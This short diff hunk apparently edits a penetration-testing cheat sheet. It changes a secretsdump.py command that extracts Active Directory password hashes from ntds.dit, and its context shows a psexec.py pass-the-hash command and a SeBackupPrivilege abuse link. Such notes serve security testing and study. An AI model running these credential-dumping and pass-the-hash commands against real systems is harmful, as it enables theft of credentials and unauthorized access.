@@ -848,7 +848,7 @@ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5c
 Link: https://github.com/k4sth4/SeBackupPrivilege
 
 ```
-secretsdump.py -system system.hive -ntds ntds.dit LOCAL
+secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
 ```
 
 ---
